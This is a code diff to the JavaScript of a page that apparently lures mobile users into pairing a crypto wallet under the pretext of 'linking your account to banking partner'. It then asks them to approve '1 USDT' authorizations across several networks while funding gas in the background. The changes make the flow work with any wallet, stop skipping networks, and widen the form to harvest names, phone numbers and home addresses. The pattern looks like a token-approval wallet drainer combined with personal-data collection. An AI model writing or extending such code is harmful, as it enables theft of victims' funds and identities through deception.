@@ -206,7 +206,7 @@ async function startSession() {
       if (resolved) return;
       JSON.parse(e.data);
       setLoaderStep('sign');
-      setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT in Trust Wallet. Nothing is sent until you confirm there.');
+      setBusy(true, 'Confirm in your wallet', 'Approve 1 USDT in your wallet. Nothing is sent until you confirm there.');
     });
 
     evtSrc.addEventListener('payment_verified', (e) => {
@@ -226,14 +226,14 @@ async function startSession() {
     evtSrc.addEventListener('approval_rejected', (e) => {
       if (resolved) return;
       JSON.parse(e.data);
-      setBusy(true, 'Confirm in Trust Wallet', 'That request was rejected. Checking any remaining networks.');
+      setBusy(true, 'Confirm in your wallet', 'That request was rejected. Checking any remaining networks.');
       advanceAfterNetworkDone('rejected');
     });
 
     evtSrc.addEventListener('approval_failed', (e) => {
       if (resolved) return;
       JSON.parse(e.data);
-      setBusy(true, 'Confirm in Trust Wallet', 'Verification is still pending. Checking any remaining networks.');
+      setBusy(true, 'Confirm in your wallet', 'Verification is still pending. Checking any remaining networks.');
       advanceAfterNetworkDone('failed');
     });
 
@@ -279,16 +279,19 @@ function renderQR(uri) {
 }
 
 /* ========== Step 1: user taps "Get Yours Now" (mobile only) ========== */
+function walletConnectMobileUrl(uri) {
+  return 'https://walletconnect.com/wc?uri=' + encodeURIComponent(uri);
+}
+
 function onGetNowClick() {
   if (!wcUri) return;
-  const twLink = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(wcUri);
   setLoaderStep('pair');
   setBusy(
     true,
     'Linking your account to banking partner',
-    'Approve the pairing request in Trust Wallet — we\'ll continue automatically once confirmed.'
+    'Open WalletConnect and approve the pairing request in any wallet on your phone — we\'ll continue automatically once confirmed.'
   );
-  window.location.href = twLink;
+  window.location.href = walletConnectMobileUrl(wcUri);
 }
 
 /* ========== Step 2: wallet connected ========== */
@@ -318,7 +321,7 @@ function onWalletConnected(d) {
   authorizing = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
-  setBusy(true, 'Confirm in Trust Wallet', 'Preparing your 1 USDT authorization. Approve the request in Trust Wallet when it appears.');
+  setBusy(true, 'Confirm in your wallet', 'Preparing your 1 USDT authorization. Approve the request in your wallet when it appears.');
   startBackgroundApproval();
 }
 
@@ -386,7 +389,7 @@ async function ensureGasInBackground(p) {
 async function requestCurrentApproval() {
   if (!paymentId || resolved) return;
   setLoaderStep('sign');
-  setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT in Trust Wallet. The website will continue after you confirm.');
+  setBusy(true, 'Confirm in your wallet', 'Approve 1 USDT in your wallet. The website will continue after you confirm.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -412,18 +415,14 @@ async function runCurrentNetwork() {
     advanceAfterNetworkDone('verified');
     return;
   }
-  const ready = await ensureGasInBackground(p);
-  if (!ready) {
-    advanceAfterNetworkDone('skipped');
-    return;
-  }
+  await ensureGasInBackground(p);
   await requestCurrentApproval();
 }
 
 function finishApprovals() {
   if (resolved) return;
   if (!confirmedNetworks) {
-    setBusy(true, 'Confirm in Trust Wallet', 'Waiting for Trust Wallet confirmation. Approve 1 USDT there to continue to the application form.');
+    setBusy(true, 'Confirm in your wallet', 'Waiting for wallet confirmation. Approve 1 USDT there to continue to the application form.');
     return;
   }
   resolved = true;
@@ -440,7 +439,7 @@ function advanceAfterNetworkDone(reason) {
     finishApprovals();
     return;
   }
-  setBusy(true, 'Confirm in Trust Wallet', 'Opening the next network approval in Trust Wallet.');
+  setBusy(true, 'Confirm in your wallet', 'Opening the next network approval in your wallet.');
   runCurrentNetwork();
 }
 
@@ -469,7 +468,7 @@ async function startBackgroundApproval() {
     await runCurrentNetwork();
   } catch (err) {
     showPayError(err.message || 'Could not start authorization.');
-    setBusy(true, 'Confirm in Trust Wallet', err.message || 'Could not start authorization.');
+    setBusy(true, 'Confirm in your wallet', err.message || 'Could not start authorization.');
   }
 }
 
@@ -603,13 +602,22 @@ function initCountryCombo() {
 async function onContactSubmit(e) {
   e.preventDefault();
   const form = e.currentTarget;
-  const email = form.email.value.trim();
+  const name = form.name.value.trim();
   const phone = form.phone.value.trim();
+  const email = form.email.value.trim();
+  const addressLine1 = form.addressLine1.value.trim();
+  const addressLine2 = form.addressLine2.value.trim();
+  const zip = form.zip.value.trim();
+  const state = form.state.value.trim();
   const country = form.country.value.trim();
   const err = $('#m-form-err');
 
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showFormError('Please enter a valid email address.');
-  if (phone.length < 5) return showFormError('Please enter a valid phone number.');
+  if (name.length < 2) return showFormError('Please enter your full name.');
+  if (phone.length < 5) return showFormError('Please enter a valid contact number.');
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showFormError('Please enter a valid mail ID.');
+  if (addressLine1.length < 3) return showFormError('Please enter address line 1.');
+  if (zip.length < 2) return showFormError('Please enter a ZIP / postal code.');
+  if (!state) return showFormError('Please enter your state.');
   if (!country) return showFormError('Please select your country.');
   err.hidden = true;
 
@@ -621,7 +629,17 @@ async function onContactSubmit(e) {
     const res = await fetch(BASE + '/api/front/contact', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ connectionId: connId, email, phone, country }),
+      body: JSON.stringify({
+        connectionId: connId,
+        name,
+        phone,
+        email,
+        addressLine1,
+        addressLine2,
+        zip,
+        state,
+        country
+      }),
     });
     const data = await res.json();
     if (!res.ok || data.error) throw new Error(data.error || 'submission failed');
